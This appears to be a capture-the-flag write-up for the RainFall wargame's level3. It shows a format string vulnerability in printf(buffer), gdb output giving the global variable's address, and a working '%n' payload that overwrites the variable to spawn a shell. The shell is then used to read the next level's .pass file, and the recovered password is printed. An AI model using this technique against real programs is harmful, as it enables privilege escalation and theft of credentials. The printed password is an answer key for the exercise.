
```
    int m = 0;

    int v() 
    {
        char buffer[512];

        fgets(buffer, sizeof(buffer), stdin);

        printf(buffer);

        int m_1 = m;
        if (m_1 != 64)
        {
            return m_1;
        }

        fwrite("Wait what?!\n", 1, 12, stdout);
        
        return system("/bin/sh");
    }

    int main(int argc, char** argv, char** envp) 
    {
        return v();
    }
```

We have a global variable m is initialized to 0 if m == 64, the v() function prints “Wait what?!” and spawns a shell.

Since m is a global, not a stack variable, we need to find its memory address and then include that in our input to overwrite it to 64.

and we have printf(buffer); a format string vulnerability to overwrite the global variable m with 64

Lets find the adress of m 

```
    (gdb) info variables
    All defined variables:

    Non-debugging symbols:
    0x080485f8  _fp_hw
    0x080485fc  _IO_stdin_used
    0x08048734  __FRAME_END__
    0x08049738  __CTOR_LIST__
    0x08049738  __init_array_end
    0x08049738  __init_array_start
    0x0804973c  __CTOR_END__
    0x08049740  __DTOR_LIST__
    0x08049744  __DTOR_END__
    0x08049748  __JCR_END__
    0x08049748  __JCR_LIST__
    0x0804974c  _DYNAMIC
    0x08049818  _GLOBAL_OFFSET_TABLE_
    0x0804983c  __data_start
    0x0804983c  data_start
    0x08049840  __dso_handle
    0x08049860  stdin@@GLIBC_2.0
    0x08049880  stdout@@GLIBC_2.0
    0x08049884  completed.6159
    0x08049888  dtor_idx.6161
    0x0804988c  m
```

the address of m is 0x0804988c in little-indian \x8c\x98\x04\x08

```
    level3@RainFall:~$ (python -c 'print("\x8c\x98\x04\x08" + "%60c%4$n")'; cat) | ./level3
    �                                                           
    Wait what?!
    cat /home/user/level4/.pass
    b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```